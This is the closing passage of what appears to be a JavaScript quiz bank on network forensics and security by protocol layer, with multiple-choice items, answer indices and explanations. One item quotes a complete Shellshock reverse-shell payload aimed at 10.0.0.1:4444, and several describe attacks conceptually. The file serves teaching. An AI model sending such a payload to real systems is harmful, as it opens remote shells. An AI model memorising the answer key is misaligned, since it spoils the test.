    "id": "q_c2_m2_168",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "Why were perimeter network firewalls unable to prevent the Heartbleed attack from exploiting vulnerable web servers?",
    "options": [
      "Firewalls were powered off.",
      "Firewalls inspected port numbers (Layer 4) and permitted traffic on TCP 443; the vulnerability existed inside the encrypted TLS application layer (Layer 7) payload.",
      "Heartbleed operated over Bluetooth.",
      "Heartbleed corrupted the router's physical cabling."
    ],
    "correct": 1,
    "explanation": "Heartbleed was an application/presentation layer vulnerability inside TLS; standard Layer 4 firewalls permitting port 443 had no visibility into malformed heartbeat requests."
  },
  {
    "id": "q_c2_m2_169",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "In the fictional Peacock Finance case study, why did allowing outbound TCP port 443 fail to protect against malware exfiltration?",
    "options": [
      "Port 443 is inherently insecure.",
      "Malware used port 443 for cleartext command-and-control communication; the Layer 4 firewall only checked the port number and did not verify whether the payload was legitimate TLS.",
      "The firewall was infected by a physical virus.",
      "The attacker changed the IP address to 127.0.0.1."
    ],
    "correct": 1,
    "explanation": "Ports are merely transport numbers; malware can bind to port 443 to transmit arbitrary unauthorized traffic across naive Layer 4 egress filters."
  },
  {
    "id": "q_c2_m2_170",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "Which switch security feature prevents an attacker from launching a MAC flooding attack to exhaust the CAM table?",
    "options": [
      "Dynamic ARP Inspection (DAI)",
      "Switch Port Security (limiting MAC addresses per port)",
      "BPDU Guard",
      "Spanning Tree Protocol"
    ],
    "correct": 1,
    "explanation": "Port Security limits the number of MAC addresses learned on a physical switch port and shuts down the port if an overflow threshold is violated."
  },
  {
    "id": "q_c2_m2_171",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "Which switch security feature intercepts and validates ARP packets against trusted DHCP snooping bindings to prevent ARP poisoning?",
    "options": [
      "Dynamic ARP Inspection (DAI)",
      "Port Security",
      "VLAN Access Maps",
      "IGMP Snooping"
    ],
    "correct": 0,
    "explanation": "Dynamic ARP Inspection (DAI) inspects ARP packets on untrusted switch ports, dropping forged ARP replies that do not match the DHCP snooping binding database."
  },
  {
    "id": "q_c2_m2_172",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "At which layer of the protocol stack does an SQL Injection (SQLi) attack occur?",
    "options": [
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 7 (Application)"
    ],
    "correct": 3,
    "explanation": "SQL injection targets database queries generated by application software at Layer 7 (Application Layer)."
  },
  {
    "id": "q_c2_m2_173",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "At which layer of the protocol stack does an ARP cache poisoning attack occur?",
    "options": [
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 4 (Transport)",
      "Layer 7 (Application)"
    ],
    "correct": 0,
    "explanation": "ARP operates at Layer 2 (Data Link Layer) to resolve IP addresses to MAC addresses within a broadcast domain."
  },
  {
    "id": "q_c2_m2_174",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "At which layer of the protocol stack does a BGP route hijacking attack occur?",
    "options": [
      "Layer 1 (Physical)",
      "Layer 2 (Data Link)",
      "Layer 3 (Network)",
      "Layer 5 (Session)"
    ],
    "correct": 2,
    "explanation": "BGP route hijacking manipulates autonomous system routing paths and IP prefix reachability at Layer 3 (Network Layer)."
  },
  {
    "id": "q_c2_m2_175",
    "topic": "Forensics & Security by Layer",
    "difficulty": "medium",
    "q": "Why does link-layer WPA3 encryption fail to protect web traffic as it traverses the public internet?",
    "options": [
      "WPA3 encryption is broken by quantum computers.",
      "WPA3 encrypts the wireless hop between the client and the access point only; once the AP bridges the frame onto the wired network, the encryption terminates.",
      "WPA3 only encrypts IPv6 packets.",
      "WPA3 requires cleartext DNS lookups."
    ],
    "correct": 1,
    "explanation": "WPA3 is a Layer 2 link-layer control protecting only the radio hop; once traffic leaves the wireless access point onto the wired LAN and WAN, higher-layer encryption (HTTPS) is required."
  },
  {
    "id": "q_c2_m2_176",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An analyst investigates a packet capture where an attacker sent an HTTP request with an unusually long header: `User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`. What historic vulnerability was being exploited at Layer 7?",
    "options": [
      "Heartbleed (CVE-2014-0160)",
      "Shellshock (CVE-2014-6271)",
      "EternalBlue (MS17-010)",
      "Log4Shell (CVE-2021-44228)"
    ],
    "correct": 1,
    "explanation": "This string is the classic signature of Shellshock (CVE-2014-6271), where environment variables passed via Layer 7 HTTP CGI headers executed arbitrary Bash commands."
  },
  {
    "id": "q_c2_m2_177",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An analyst decodes a raw IPv4 packet header: `45 00 00 54 12 34 40 00 3c 01 ...`. What is the TTL in decimal and what is the protocol?",
    "options": [
      "TTL = 60, Protocol = ICMP",
      "TTL = 64, Protocol = TCP",
      "TTL = 128, Protocol = UDP",
      "TTL = 32, Protocol = OSPF"
    ],
    "correct": 0,
    "explanation": "Byte 8 is TTL: 0x3c = 60 in decimal. Byte 9 is Protocol: 0x01 = ICMP. Therefore, TTL is 60 and the protocol is ICMP."
  },
  {
    "id": "q_c2_m2_178",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "In a packet capture containing an encrypted TLS 1.3 session over TCP port 443, which specific fields can a network analyst inspect without decrypting the payload?",
    "options": [
      "The full HTTP request URI and cookies",
      "Source/Destination MACs, Source/Destination IPs, TCP Ports, TCP Flags, Window Size, and the unencrypted TLS Server Name Indication (SNI) extension in the ClientHello",
      "The cleartext database credentials",
      "The decrypted HTML response"
    ],
    "correct": 1,
    "explanation": "Headers up to Layer 4 are in cleartext. In addition, the initial TLS ClientHello contains the unencrypted SNI (target hostname), while subsequent application payloads are encrypted."
  },
  {
    "id": "q_c2_m2_179",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An incident responder detects that an attacker installed a rogue DHCP server on an internal corporate VLAN. What attack can the rogue server execute against clients?",
    "options": [
      "It forces clients to run single-mode optical fiber.",
      "By replying faster than the legitimate DHCP server, it provides clients with a rogue Default Gateway and rogue DNS server, intercepting all outbound client traffic in a man-in-the-middle attack.",
      "It physically shuts down the switch power supply.",
      "It decrypts all WPA3 enterprise passwords."
    ],
    "correct": 1,
    "explanation": "A rogue DHCP server hands out attacker-controlled IP configurations, establishing itself as the default gateway or DNS resolver to intercept and tamper with all client traffic."
  },
  {
    "id": "q_c2_m2_180",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "What switch security technology permanently neutralizes rogue DHCP server attacks?",
    "options": [
      "DHCP Snooping: configuring access ports as untrusted so DHCP Offer/Ack messages are dropped, while designating legitimate DHCP server uplink ports as trusted.",
      "Port Security with sticky MAC addresses",
      "Dynamic DNS updates",
      "IEEE 802.1Q double tagging"
    ],
    "correct": 0,
    "explanation": "DHCP Snooping drops DHCP server responses (DHCPOFFER, DHCPACK) appearing on untrusted user ports, preventing rogue servers from issuing leases."
  },
  {
    "id": "q_c2_m2_181",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "During a forensic PCAP investigation, an analyst identifies an IPv4 packet where byte 6 (Flags and Fragment Offset high byte) is 0x40. What does this bit configuration indicate?",
    "options": [
      "More Fragments (MF) bit is set to 1.",
      "Don't Fragment (DF) bit is set to 1, and the Fragment Offset is 0.",
      "The packet is an ICMP Redirect.",
      "The packet has an evil bit set."
    ],
    "correct": 1,
    "explanation": "0x40 in binary is 01000000. Bit 0 is reserved (0), Bit 1 is the Don't Fragment (DF) flag (1), and Bit 2 is More Fragments (0)."
  },
  {
    "id": "q_c2_m2_182",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An analyst reviews a Wireshark capture of an attempted TCP port scan. Which scan type is identified by a TCP segment with flags set to FIN, PSH, and URG (hex 0x29) with no SYN or ACK?",
    "options": [
      "TCP SYN Stealth Scan",
      "XMAS Tree Scan",
      "TCP Null Scan",
      "TCP ACK Scan"
    ],
    "correct": 1,
    "explanation": "An XMAS scan sets FIN (0x01) + PSH (0x08) + URG (0x20) = 0x29 ('lit up like a Christmas tree'), probing RFC 793 compliant systems that drop packets on open ports but reply with RST on closed ports."
  },
  {
    "id": "q_c2_m2_183",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An analyst reviews a Wireshark capture of an attempted TCP port scan where the flags byte in the TCP header is 0x00. What scan type is this?",
    "options": [
      "XMAS Scan",
      "TCP Null Scan",
      "TCP SYN Scan",
      "TCP FIN Scan"
    ],
    "correct": 1,
    "explanation": "A TCP Null scan has all flag bits cleared (0x00), exploiting RFC 793 edge cases to determine port status."
  },
  {
    "id": "q_c2_m2_184",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "In an enterprise DMZ, an administrator configures a stateful firewall to inspect outbound connections. Why is an active FTP session (using TCP ports 21 and 20) problematic for stateful firewalls?",
    "options": [
      "FTP is encrypted and cannot be parsed.",
      "In active FTP, the client connects to server port 21 (control), but the server initiates a separate inbound connection from port 20 to a high client port (data), which standard stateful firewalls block unless an FTP application-layer gateway (ALG) inspects control commands.",
      "FTP requires IPv6.",
      "FTP does not use TCP."
    ],
    "correct": 1,
    "explanation": "Active FTP requires the server to initiate an inbound data connection to the client; without an Application Layer Gateway (ALG) inspecting the PORT command inside the control channel, the firewall drops the inbound data stream."
  },
  {
    "id": "q_c2_m2_185",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "Why is passive FTP (PASV mode) widely preferred over active FTP in modern firewall-protected networks?",
    "options": [
      "Passive FTP encrypts all data using TLS 1.3.",
      "In passive FTP, the client initiates BOTH the control connection (port 21) and the data connection (to an ephemeral server port), allowing stateful firewalls to track both as outbound sessions.",
      "Passive FTP does not require IP addresses.",
      "Passive FTP operates over UDP."
    ],
    "correct": 1,
    "explanation": "In passive FTP, the client initiates all outbound connections, aligning perfectly with standard stateful firewall rules that permit outbound traffic."
  },
  {
    "id": "q_c2_m2_186",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "How does a TCP SYN Cookie defense defeat high-volume SYN flood denial-of-service attacks without allocating server memory buffers?",
    "options": [
      "It drops all SYN packets indiscriminately.",
      "The server encodes connection parameters (timestamp, MSS, client IP/port) cryptographically into the 32-bit Initial Sequence Number (ISN) of the SYN-ACK; only when the client returns an ACK with the valid computed number does the server allocate memory.",
      "It requires the client to solve a proof-of-work CAPTCHA at Layer 2.",
      "It converts the TCP connection into a UDP datagram."
    ],
    "correct": 1,
    "explanation": "SYN cookies avoid allocating server transmission control blocks (TCBs) upon receiving a SYN. Instead, the server encodes state into the SYN-ACK sequence number, allocating memory only when the client returns a matching ACK."
  },
  {
    "id": "q_c2_m2_187",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An investigator inspects a PCAP and observes a burst of ICMP Type 8 Code 0 packets followed by ICMP Type 0 Code 0 packets. What operational utility generated these packets?",
    "options": [
      "traceroute",
      "ping (ICMP Echo Request and Echo Reply)",
      "arp -a",
      "netstat -ano"
    ],
    "correct": 1,
    "explanation": "ICMP Type 8 Code 0 is an Echo Request, and Type 0 Code 0 is an Echo Reply, which are the fundamental messages of the `ping` command."
  },
  {
    "id": "q_c2_m2_188",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An investigator inspects a PCAP and observes ICMP Type 11 Code 0 packets returned to a host. What does this message represent?",
    "options": [
      "Destination Host Unreachable",
      "Time-to-Live (TTL) Exceeded in Transit",
      "Echo Reply",
      "Redirect for Network"
    ],
    "correct": 1,
    "explanation": "ICMP Type 11 Code 0 designates 'Time-to-Live exceeded in transit', emitted by routers when an IP packet's TTL reaches 0."
  },
  {
    "id": "q_c2_m2_189",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An investigator inspects a PCAP and observes ICMP Type 3 Code 3 packets returned to a scanner. What does this message represent?",
    "options": [
      "Network Unreachable",
      "Destination Port Unreachable (typically indicating a closed UDP port)",
      "Host Unreachable",
      "Fragmentation Needed"
    ],
    "correct": 1,
    "explanation": "ICMP Type 3 Code 3 denotes 'Destination Port Unreachable', generated by an operating system when a UDP datagram arrives for a closed port."
  },
  {
    "id": "q_c2_m2_190",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An investigator inspects a PCAP and observes ICMP Type 3 Code 13 packets. What does this message indicate?",
    "options": [
      "Destination Port Unreachable",
      "Communication Administratively Filtered (dropped by a firewall or router ACL)",
      "TTL Expired",
      "Bad IP Checksum"
    ],
    "correct": 1,
    "explanation": "ICMP Type 3 Code 13 indicates that traffic was 'Administratively Filtered' by an access control list (ACL) or firewall rule."
  },
  {
    "id": "q_c2_m2_191",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "Why is DNS over UDP port 53 susceptible to cache poisoning via Kaminsky-style spoofing attacks?",
    "options": [
      "UDP packets are not encrypted and have only a 16-bit Transaction ID and source port for entropy; an attacker flooding forged responses can guess these numbers before the authentic server responds.",
      "UDP packets cannot carry DNS records.",
      "DNS over UDP requires physical cable access.",
      "UDP checksums cannot detect errors."
    ],
    "correct": 0,
    "explanation": "Because UDP is connectionless, an attacker can flood thousands of spoofed DNS responses with guessed 16-bit Transaction IDs and source ports; if a guess matches before the real response arrives, the cache is poisoned."
  },
  {
    "id": "q_c2_m2_192",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "What cryptographic security extension was developed to solve DNS spoofing and cache poisoning by digitally signing DNS resource records?",
    "options": [
      "DNSSEC (Domain Name System Security Extensions)",
      "DoH (DNS over HTTPS)",
      "DoT (DNS over TLS)",
      "mDNS (Multicast DNS)"
    ],
    "correct": 0,
    "explanation": "DNSSEC provides origin authentication, data integrity, and authenticated denial of existence for DNS records using public-key cryptography."
  },
  {
    "id": "q_c2_m2_193",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An analyst detects a 'TCP Window Exhaustion' attack against an enterprise server. What protocol mechanism was manipulated?",
    "options": [
      "The attacker sets the IP TTL to 1.",
      "The attacker sends requests but continuously advertises a TCP Window Size of 0, forcing the server to keep the session alive and repeatedly send window probe packets, exhausting server socket handles.",
      "The attacker floods the switch with random MAC addresses.",
      "The attacker alters the DNS TTL."
    ],
    "correct": 1,
    "explanation": "By advertising a Window Size of 0 (Zero Window), the client informs the server it cannot receive data, forcing the server to buffer the response and consume connection state resources."
  },
  {
    "id": "q_c2_m2_194",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An analyst uses TShark with the filter `tcp.analysis.retransmission`. What underlying network condition does a surge in this metric indicate?",
    "options": [
      "Packets are arriving faster than line rate.",
      "Packets or acknowledgements are being dropped in transit (due to congestion, link errors, or packet filters), causing TCP timers to expire and retransmit unacknowledged segments.",
      "The server has enabled jumbo frames.",
      "The client is using HTTP/3."
    ],
    "correct": 1,
    "explanation": "TCP retransmissions occur when the sender does not receive an acknowledgement within the Retransmission Timeout (RTO) or receives duplicate ACKs, signaling packet loss."
  },
  {
    "id": "q_c2_m2_195",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "What is the difference between a TCP Fast Retransmit and a standard Timeout Retransmission?",
    "options": [
      "Fast Retransmit requires optical fiber cables.",
      "Fast Retransmit triggers when the sender receives 3 duplicate ACKs (indicating an out-of-order gap), retransmitting immediately without waiting for the full RTO timer to expire.",
      "Fast Retransmit only operates on UDP.",
      "Fast Retransmit is initiated by intermediate routers."
    ],
    "correct": 1,
    "explanation": "When a receiver gets out-of-order segments, it repeats its last ACK; receiving 3 duplicate ACKs triggers Fast Retransmit, resending the missing segment immediately."
  },
  {
    "id": "q_c2_m2_196",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "An attacker attempts a 'Slowloris' denial-of-service attack against a web server. At which layer does Slowloris operate, and how does it evade traditional Layer 4 volumetric defenses?",
    "options": [
      "Layer 3; it floods the router with spoofed IP fragments.",
      "Layer 7; it opens legitimate TCP connections and sends partial HTTP headers very slowly, holding web server worker threads open without generating high bandwidth or triggering Layer 4 volumetric flood alarms.",
      "Layer 2; it exhausts switch CAM tables.",
      "Layer 1; it jams Wi-Fi radio frequencies."
    ],
    "correct": 1,
    "explanation": "Slowloris is an application-layer (Layer 7) resource exhaustion attack; by sending incomplete HTTP headers at periodic intervals, it ties up web server connection pools without generating high packet volumes."
  },
  {
    "id": "q_c2_m2_197",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "In an enterprise with strict compliance requirements, why must Network Intrusion Detection Systems (NIDS) decrypt TLS traffic (using SSL Forward Proxy or TLS termination)?",
    "options": [
      "NIDS hardware cannot process cleartext packets.",
      "Because TLS encrypts all Layer 7 application data, a NIDS that cannot decrypt traffic is blind to web exploits, malware payloads, and exfiltration traversing HTTPS.",
      "TLS alters the Layer 2 Ethernet headers.",
      "Decryption is required to calculate IP checksums."
    ],
    "correct": 1,
    "explanation": "TLS encrypts all application payload data; without TLS inspection/decryption, intrusion detection systems cannot inspect payloads for signatures, malware, or policy violations."
  },
  {
    "id": "q_c2_m2_198",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "During an audit, an engineer observes that a switch port is configured with `switchport port-security mac-address sticky`. What does this configuration command enforce?",
    "options": [
      "The port dynamically learns MAC addresses and permanently writes them to the running configuration, locking the port to those learned addresses.",
      "The port glues all optical fibers together.",
      "The port allows any MAC address to connect without limits.",
      "The port converts all frames to UDP."
    ],
    "correct": 0,
    "explanation": "'Sticky MAC' dynamically learns the MAC address of the currently attached device and saves it into the switch running-config, restricting that physical port to that specific device."
  },
  {
    "id": "q_c2_m2_199",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "Why is BGP route hijacking a devastating vulnerability at the Internet Layer (Layer 3)?",
    "options": [
      "It burns out the physical transceivers on undersea cables.",
      "BGP historically relies on implicit trust between Autonomous Systems; an AS announcing unauthorized IP prefixes can divert global internet traffic through rogue routers for interception or blackholing before detection.",
      "BGP automatically decrypts all HTTPS sessions.",
      "BGP overrides endpoint root passwords."
    ],
    "correct": 1,
    "explanation": "BGP lacks built-in cryptographic authentication of prefix ownership; if a rogue network advertises a more specific route, global routers forward traffic to the attacker."
  },
  {
    "id": "q_c2_m2_200",
    "topic": "Forensics & Security by Layer",
    "difficulty": "difficult",
    "q": "What security framework provides cryptographic validation of BGP Route Origin Authorizations (ROAs) using public key infrastructure (PKI)?",
    "options": [
      "RPKI (Resource Public Key Infrastructure)",
      "DNSSEC",
      "IPsec ESP",
      "WPA3 Enterprise"
    ],
    "correct": 0,
    "explanation": "RPKI uses cryptographic certificates to bind autonomous system numbers (ASNs) to specific IP address blocks, allowing routers to drop invalid BGP route announcements."
  }
];

export const module2QuestionBank = c2_module2QuestionBank;
export default c2_module2QuestionBank;
